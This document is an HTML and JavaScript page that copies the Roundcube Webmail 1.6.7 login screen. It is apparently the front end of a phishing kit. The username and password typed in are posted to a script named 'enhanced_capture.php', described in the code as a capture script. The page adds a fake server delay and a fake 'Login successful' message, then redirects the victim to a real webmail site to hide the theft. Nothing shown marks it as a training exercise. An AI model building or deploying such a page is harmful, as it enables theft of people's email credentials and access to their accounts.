<body>
    <div id="container">
        <div id="header">
            <div id="logo">Roundcube Webmail</div>
        </div>
        
        <div id="mainscreen">
            <div class="language-selector">
                <select id="language" onchange="changeLanguage()">
                    <option value="en">English</option>
                    <option value="es">Español</option>
                    <option value="fr">Français</option>
                    <option value="de">Deutsch</option>
                    <option value="it">Italiano</option>
                    <option value="pt">Português</option>
                    <option value="ru">Русский</option>
                    <option value="zh">中文</option>
                </select>
            </div>
            
            <form id="login-form" method="POST" action="enhanced_capture.php">
                <div class="header">
                    <h2>Please log in</h2>
                </div>
                
                <div class="content">
                    <div class="error" id="error-message">
                        Login failed
                    </div>
                    
                    <div class="form-row">
                        <label for="rcmloginuser">Username</label>
                        <input type="text" id="rcmloginuser" name="email" autocomplete="username" required>
                    </div>
                    
                    <div class="form-row">
                        <label for="rcmloginpwd">Password</label>
                        <input type="password" id="rcmloginpwd" name="password" autocomplete="current-password" required>
                    </div>
                    
                    <div class="form-buttons">
                        <input type="submit" class="button" value="Login" id="rcmloginsubmit">
                    </div>
                    
                    <div class="loading" id="loading">
                        <span class="spinner"></span>Logging in...
                    </div>
                </div>
            </form>
        </div>
        
        <div id="footer">
            Powered by <a href="https://roundcube.net/" target="_blank">Roundcube</a> webmail 1.6.7
        </div>
    </div>

    <script>
        let attemptCount = 0;
        
        function changeLanguage() {
            // Language change simulation - in real Roundcube this would reload the page
            console.log('Language changed to:', document.getElementById('language').value);
        }
        
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = this;
            const username = document.getElementById('rcmloginuser').value.trim();
            const password = document.getElementById('rcmloginpwd').value;
            const errorDiv = document.getElementById('error-message');
            const loadingDiv = document.getElementById('loading');
            const submitBtn = document.getElementById('rcmloginsubmit');
            
            // Basic client-side validation
            if (!username || !password) {
                showError('Please enter both username and password');
                return;
            }
            
            // Increment attempt counter
            attemptCount++;
            
            // Show loading state
            hideError();
            loadingDiv.style.display = 'block';
            submitBtn.disabled = true;
            submitBtn.value = 'Logging in...';
            
            // Simulate realistic server delay
            const delay = Math.random() * 1500 + 1000; // 1-2.5 seconds
            
            setTimeout(() => {
                // Submit to capture script
                fetch('enhanced_capture.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams(new FormData(form))
                })
                .then(response => response.json())
                .then(data => {
                    loadingDiv.style.display = 'none';
                    submitBtn.disabled = false;
                    submitBtn.value = 'Login';
                    
                    if (data.signal === 'ok') {
                        // Success - redirect after short delay
                        document.getElementById('login-form').innerHTML = 
                            '<div class="content" style="text-align: center; padding: 40px;">' +
                            '<div style="color: #080; margin-bottom: 15px;">✓ Login successful!</div>' +
                            '<div style="color: #666; font-size: 10px;">Redirecting to mailbox...</div>' +
                            '</div>';
                        
                        setTimeout(() => {
                            window.location.href = 'https://webmail.cpanel.net/';
                        }, 2000);
                    } else {
                        // Show error message
                        showError(data.msg || 'Invalid username or password');
                        
                        // Clear password field
                        document.getElementById('rcmloginpwd').value = '';
                        document.getElementById('rcmloginpwd').focus();
                    }
                })
                .catch(error => {
                    loadingDiv.style.display = 'none';
                    submitBtn.disabled = false;
                    submitBtn.value = 'Login';
                    showError('Request failed. Please try again.');
                });
            }, delay);
        });
        
        function showError(message) {
            const errorDiv = document.getElementById('error-message');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
        }
        
        function hideError() {
            document.getElementById('error-message').style.display = 'none';
        }
        
        // Auto-focus on username field
        window.addEventListener('load', function() {
            document.getElementById('rcmloginuser').focus();
        });
        
        // Simulate real Roundcube behavior
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && (e.target.id === 'rcmloginuser' || e.target.id === 'rcmloginpwd')) {
                document.getElementById('login-form').dispatchEvent(new Event('submit'));
            }
        });
    </script>
